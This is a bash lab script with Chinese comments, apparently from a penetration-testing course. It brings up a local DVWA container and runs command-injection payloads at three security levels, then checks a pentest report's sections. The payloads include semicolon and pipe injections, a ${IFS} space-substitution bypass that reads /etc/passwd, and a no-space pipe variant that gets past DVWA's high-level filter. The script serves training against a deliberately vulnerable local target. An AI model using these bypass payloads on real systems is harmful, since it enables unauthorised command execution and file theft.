#!/usr/bin/env bash
# =============================================================================
# 18 · 命令注入与 DVWA 综合通关 —— 三档利用 + 渗透报告核验
# 用法: ./cmd_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: 实验 12 的 DVWA 栈（本脚本自动拉起）
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"

PY="${PYTHON:-python3}"
ART="artifacts"
REPORT="DVWA渗透测试报告.md"

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

run() {  # $1=档位 $2=注入串 [$3=grep]
    if [ -n "${3:-}" ]; then
        "$PY" cmd_lab.py run --level "$1" --ip "$2" --grep "$3" | tee "$ART/run-$1.out"
    else
        "$PY" cmd_lab.py run --level "$1" --ip "$2" | tee "$ART/run-$1.out"
    fi
}

do_apply() {
    step "apply" "拉起 DVWA + 生成 payload 速查表"
    mkdir -p "$ART"
    ../12_dvwa/dvwa.sh apply | tail -2
    "$PY" cmd_lab.py gen | tee "$ART/gen.out"
    grep -q "high：" "$ART/gen.out" || die "速查表生成异常"
    ok "注入点就绪：http://127.0.0.1:8612/vulnerabilities/exec/（ip 参数）"
}

do_observe() {
    step "observe" "① low：无过滤——分号与管道四式随意"
    run low '127.0.0.1; whoami'
    grep -q "root" "$ART/run-low.out" || die "low 分号注入失败"
    run low '127.0.0.1 | id'
    grep -q "uid=0" "$ART/run-low.out" || die "low 管道注入失败"
    ok "low：whoami → root、id → uid=0（容器内 Web 进程是 root）"

    step "observe" "② medium：删了 && 和 ;——用 | 照走，\${IFS} 替代空格"
    run medium '127.0.0.1; whoami'
    grep -q "root" "$ART/run-medium.out" && die "medium 分号竟未被拦住"
    ok "负例成立：分号被删后只剩多主机 ping，无回显"
    run medium '127.0.0.1 | whoami'
    grep -q "root" "$ART/run-medium.out" || die "medium 管道绕过失败"
    run medium '127.0.0.1|cat${IFS}/etc/passwd' 'root:'
    grep -q "root:x:0:0" "$ART/run-medium.out" || die "medium \${IFS} 读文件失败"
    ok "medium：| 绕过照走；\${IFS} 当空格用——黑名单缺一项就等于没拦"

    step "observe" "③ high：|| & ; |␣ - \$ ( ) 反引号全删——用 | 变体（不加空格）"
    run high '127.0.0.1 | whoami'
    grep -q "root" "$ART/run-high.out" && die "high 带空格管道竟未被拦住"
    ok "负例成立：'| '（管道加空格）被整段删除，命令没拼上"
    run high '127.0.0.1|whoami'
    grep -q "root" "$ART/run-high.out" || die "high | 变体绕过失败"
    ok "high：管道后不放空格（|whoami）即存活——验收标准中的 | 变体"

    step "observe" "④ 综合通关报告核验：6 类漏洞、等级信息与实测一致"
    [ -f "$REPORT" ] || die "缺少《$REPORT》"
    local n
    n="$(grep -c '^### 3\.' "$REPORT")"
    [ "$n" = "6" ] || die "报告漏洞小节数应为 6，实际 $n"
    local kw
    for kw in "SQL 注入" "XSS" "CSRF" "SSRF" "文件上传" "暴力破解" "命令注入"; do
        grep -q "$kw" "$REPORT" || die "报告缺少 $kw 相关内容"
    done
    grep -q "实验 13" "$REPORT" && grep -q "实验 18" "$REPORT" || die "报告缺少实测依据标注"
    ok "报告就位：6 个漏洞小节、等级表与实验 13-18 的实测一一对应"
}

do_clean() {
    step "clean" "清理生成物（靶场保持运行）"
    rm -rf "$ART"
    ok "产物已清；靶场留着，要拆用 ../12_dvwa/dvwa.sh clean"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
